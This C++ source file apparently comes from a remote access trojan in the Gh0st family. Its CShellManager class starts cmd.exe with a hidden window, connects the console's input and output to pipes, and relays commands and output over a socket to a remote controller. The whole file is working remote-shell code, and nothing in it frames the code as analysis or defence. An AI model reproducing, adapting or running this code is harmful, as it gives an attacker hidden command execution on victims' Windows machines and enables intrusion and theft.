// ShellManager.cpp: implementation of the CShellManager class.
//
////////////////////////////////////////////////////////////////////////

#include "ShellManager.h"
#include <tchar.h>

////////////////////////////////////////////////////////////////////////
// Construction/Destruction
////////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient) : CManager(pClient)
{
	m_hReadPipeDll = NULL;
	m_hWritePipeDll = NULL;
	m_hReadPipeShell = NULL;
	m_hWritePipeShell = NULL;
	m_hProcess = NULL;
	m_hThreadRead = NULL;
	m_hThreadMonitor = NULL;
	m_bIsRunning = FALSE;

	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeDll, &sa, 0))
	{
		return;
	}

	if (!CreatePipe(&m_hReadPipeDll, &m_hWritePipeShell, &sa, 0))
	{
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeDll);
		m_hReadPipeShell = NULL;
		m_hWritePipeDll = NULL;
		return;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	TCHAR szShellPath[MAX_PATH] = { 0 };

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = m_hReadPipeShell;
	si.hStdOutput = m_hWritePipeShell;
	si.hStdError = m_hWritePipeShell;

	GetSystemDirectory(szShellPath, MAX_PATH);
	_tcscat(szShellPath, _T("\\cmd.exe"));

	if (!CreateProcess(szShellPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
	{
		CloseHandle(m_hReadPipeDll);
		CloseHandle(m_hWritePipeDll);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		m_hReadPipeDll = NULL;
		m_hWritePipeDll = NULL;
		m_hReadPipeShell = NULL;
		m_hWritePipeShell = NULL;
		return;
	}

	m_hProcess = pi.hProcess;
	CloseHandle(pi.hThread);

	CloseHandle(m_hReadPipeShell);
	CloseHandle(m_hWritePipeShell);
	m_hReadPipeShell = NULL;
	m_hWritePipeShell = NULL;

	BYTE bToken = TOKEN_SHELL_START;
	Send(&bToken, sizeof(bToken));

	WaitForDialogOpen();

	m_bIsRunning = TRUE;
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, this, 0, NULL);
}

CShellManager::~CShellManager()
{
	m_bIsRunning = FALSE;

	if (m_hProcess != NULL)
	{
		TerminateProcess(m_hProcess, 0);
		WaitForSingleObject(m_hProcess, 2000);
		CloseHandle(m_hProcess);
		m_hProcess = NULL;
	}

	if (m_hWritePipeDll != NULL)
	{
		CloseHandle(m_hWritePipeDll);
		m_hWritePipeDll = NULL;
	}
	if (m_hReadPipeDll != NULL)
	{
		CloseHandle(m_hReadPipeDll);
		m_hReadPipeDll = NULL;
	}

	if (m_hThreadRead != NULL)
	{
		WaitForSingleObject(m_hThreadRead, 2000);
		CloseHandle(m_hThreadRead);
		m_hThreadRead = NULL;
	}
	if (m_hThreadMonitor != NULL)
	{
		WaitForSingleObject(m_hThreadMonitor, 2000);
		CloseHandle(m_hThreadMonitor);
		m_hThreadMonitor = NULL;
	}
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}

	if (m_hWritePipeDll == NULL || nSize == 0)
		return;

	DWORD dwBytesWrite = 0;
	WriteFile(m_hWritePipeDll, lpBuffer, nSize, &dwBytesWrite, NULL);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	CHAR szBuffer[4096];
	DWORD dwBytesRead = 0;
	DWORD dwTotalAvail = 0;

	while (pThis->m_bIsRunning)
	{
		Sleep(100);

		while (PeekNamedPipe(pThis->m_hReadPipeDll, szBuffer, sizeof(szBuffer),
			&dwBytesRead, &dwTotalAvail, NULL))
		{
			if (dwBytesRead == 0)
				break;

			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwTotalAvail);
			if (lpBuffer == NULL)
				break;

			if (ReadFile(pThis->m_hReadPipeDll, lpBuffer, dwTotalAvail, &dwBytesRead, NULL)
				&& dwBytesRead > 0)
			{
				pThis->Send(lpBuffer, dwBytesRead);
			}

			LocalFree(lpBuffer);
		}
	}

	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hWait[2];
	hWait[0] = pThis->m_hProcess;
	hWait[1] = pThis->m_hThreadRead;

	WaitForMultipleObjects(2, hWait, FALSE, INFINITE);

	pThis->m_bIsRunning = FALSE;

	if (pThis->m_pClient != NULL)
		pThis->m_pClient->Disconnect();

	return 0;
}
